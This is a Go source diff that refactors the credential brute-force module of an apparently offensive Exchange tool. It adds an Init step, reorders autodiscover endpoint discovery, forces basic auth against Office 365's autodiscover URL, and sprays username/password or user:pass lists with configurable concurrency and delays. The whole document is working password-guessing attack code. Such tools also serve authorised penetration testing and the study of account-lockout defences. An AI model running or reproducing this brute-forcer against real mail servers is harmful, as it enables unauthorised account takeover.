@@ -24,6 +24,16 @@ type Result struct {
 }
 
 var concurrency = 3 //limit the number of consecutive attempts
+var delay = 5
+var consc = 3
+var usernames []string
+var passwords []string
+var userpass []string
+var autodiscoverURL string
+var basic = false
+var verbose = false
+var insecure = false
+var stopSuccess = false
 
 func autodiscoverDomain(domain string) string {
 	var autodiscoverURL string
@@ -31,29 +41,32 @@ func autodiscoverDomain(domain string) string {
 	//check if this is just a domain or a redirect (starts with http[s]://)
 	if m, _ := regexp.Match("http[s]?://", []byte(domain)); m == true {
 		autodiscoverURL = domain
+		utils.Info.Printf("Using end-point: %s\n", domain)
 	} else {
 		//create the autodiscover url
 		if autodiscoverStep == 0 {
-			autodiscoverURL = createAutodiscover(domain, true)
+			utils.Info.Println("Trying to Autodiscover domain")
+			autodiscoverURL = createAutodiscover(fmt.Sprintf("autodiscover.%s", domain), true)
+			utils.Trace.Printf("Autodiscover step %d - URL: %s\n", autodiscoverStep, autodiscoverURL)
 			if autodiscoverURL == "" {
 				autodiscoverStep++
 			}
 		}
 		if autodiscoverStep == 1 {
-			autodiscoverURL = createAutodiscover(fmt.Sprintf("autodiscover.%s", domain), true)
+			autodiscoverURL = createAutodiscover(fmt.Sprintf("autodiscover.%s", domain), false)
+			utils.Trace.Printf("Autodiscover step %d - URL: %s\n", autodiscoverStep, autodiscoverURL)
 			if autodiscoverURL == "" {
 				autodiscoverStep++
 			}
 		}
 		if autodiscoverStep == 2 {
-			autodiscoverURL = createAutodiscover(fmt.Sprintf("autodiscover.%s", domain), false)
+			autodiscoverURL = createAutodiscover(domain, true)
+			utils.Trace.Printf("Autodiscover step %d - URL: %s\n", autodiscoverStep, autodiscoverURL)
 			if autodiscoverURL == "" {
 				return ""
 			}
 		}
 	}
-
-	utils.Trace.Printf("Autodiscover step %d - URL: %s\n", autodiscoverStep, autodiscoverURL)
 
 	req, err := http.NewRequest("GET", autodiscoverURL, nil)
 	req.Header.Add("Content-Type", "text/xml")
@@ -80,23 +93,48 @@ func autodiscoverDomain(domain string) string {
 	return ""
 }
 
-//BruteForce function takes a domain/URL, file path to users and filepath to passwords whether to use BASIC auth and to trust insecure SSL
-//And whether to stop on success
-func BruteForce(domain, usersFile, passwordsFile string, basic, insecure, stopSuccess, verbose bool, consc, delay int) {
-	utils.Info.Println("Trying to Autodiscover domain")
-	autodiscoverURL := autodiscoverDomain(domain)
+//Init function to setup the brute-force session
+func Init(domain, usersFile, passwordsFile, userpassFile string, b, i, s, v bool, c, d, t int) error {
+	autodiscoverURL = autodiscoverDomain(domain)
 
 	if autodiscoverURL == "" {
-		return
+		return fmt.Errorf("No autodiscover end-point found")
 	}
-	usernames := readFile(usersFile)
+
+	stopSuccess = s
+	insecure = i
+	basic = b
+	verbose = v
+	delay = d
+	consc = c
+	concurrency = t
+
+	if autodiscoverURL == "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml" {
+		basic = true
+	}
+
+	if userpassFile != "" {
+		userpass = readFile(userpassFile)
+		if userpass == nil {
+			return fmt.Errorf("Unable to read userpass file")
+		}
+		return nil
+	}
+	usernames = readFile(usersFile)
 	if usernames == nil {
-		return
+		return fmt.Errorf("Unable to read usernames file")
 	}
-	passwords := readFile(passwordsFile)
+	passwords = readFile(passwordsFile)
 	if passwords == nil {
-		return
+		return fmt.Errorf("Unable to read passwords file")
 	}
+
+	return nil
+}
+
+//BruteForce function takes a domain/URL, file path to users and filepath to passwords whether to use BASIC auth and to trust insecure SSL
+//And whether to stop on success
+func BruteForce() {
 
 	attempts := 0
 	stp := false
@@ -131,7 +169,6 @@ func BruteForce(domain, usersFile, passwordsFile string, basic, insecure, stopSu
 					usernames = append(usernames[:out.Index], usernames[out.Index+1:]...)
 					if stopSuccess == true {
 						stp = true
-
 					}
 				}
 			}(u, p, ui)
@@ -153,17 +190,7 @@ func BruteForce(domain, usersFile, passwordsFile string, basic, insecure, stopSu
 }
 
 //UserPassBruteForce function does a bruteforce using a supplied user:pass file
-func UserPassBruteForce(domain, userpassFile string, basic, insecure, stopSuccess, verbose bool, consc, delay int) {
-	utils.Info.Println("Trying to Autodiscover domain")
-	autodiscoverURL := autodiscoverDomain(domain)
-
-	if autodiscoverURL == "" {
-		return
-	}
-	userpass := readFile(userpassFile)
-	if userpass == nil {
-		return
-	}
+func UserPassBruteForce() {
 
 	count := 0
 	sem := make(chan bool, concurrency)
@@ -176,7 +203,7 @@ func UserPassBruteForce(domain, userpassFile string, basic, insecure, stopSucces
 		// verify colon-delimited username:password format
 		s := strings.SplitN(up, ":", 2)
 		if len(s) < 2 {
-			utils.Fail.Printf("Skipping improperly formatted entry in %s:%d\n", userpassFile, count)
+			utils.Fail.Printf("Skipping improperly formatted entry at line %d\n", count)
 			continue
 		}
 		u, p := s[0], s[1]
@@ -255,8 +282,8 @@ func connect(autodiscoverURL, user, password string, basic, insecure bool) Resul
 	req, err := http.NewRequest("GET", autodiscoverURL, nil)
 	req.Header.Add("Content-Type", "text/xml")
 
-	//if we have been redirected to outlook, change the auth header to basic auth
-	if basic == false {
+	//if basic authi is required, set auth header
+	if basic == true {
 		req.SetBasicAuth(user, password)
 	}
 
@@ -268,6 +295,10 @@ func connect(autodiscoverURL, user, password string, basic, insecure bool) Resul
 			client = http.Client{Transport: InsecureRedirectsO365{User: user, Pass: password, Insecure: insecure}}
 			resp, err = client.Do(req)
 		} else {
+			if resp != nil {
+				resp.Body.Close()
+			}
+
 			result.Error = err
 			return result
 		}
